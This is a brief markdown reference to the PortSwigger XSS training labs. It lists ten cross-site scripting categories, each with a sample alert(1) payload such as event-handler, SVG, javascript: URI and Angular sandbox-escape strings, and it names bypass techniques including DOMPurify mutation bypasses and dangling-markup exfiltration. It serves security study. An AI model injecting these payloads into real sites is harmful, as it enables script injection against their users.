# PortSwigger XSS Labs — Complete Reference

## Categories (30+ labs)
1. **Reflected XSS** — `<script>alert(1)</script>` in params
2. **Stored XSS** — Payload in comments/profile/name, triggers for all viewers
3. **DOM XSS** — document.write(location.hash), innerHTML sinks
4. **XSS with event handlers** — `<img src=x onerror=alert(1)>`
5. **XSS with angle brackets protected** — `" autofocus onfocus=alert(1) x="`
6. **XSS with href/javascript** — `javascript:alert(1)` in links
7. **XSS with SVG** — `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
8. **XSS via Angular expression** — `{{constructor.constructor('alert(1)')()}}`
9. **XSS via template injection** — `${alert(1)}`
10. **XSS via mXSS (Mutation)** — InnerHTML mutation bypasses sanitizers

## Key Bypass Techniques
- Polyglot XSS payloads
- Dangling markup for data exfiltration
- UTF-7/8/16 encoding bypasses
- DOMPurify bypasses via mutation
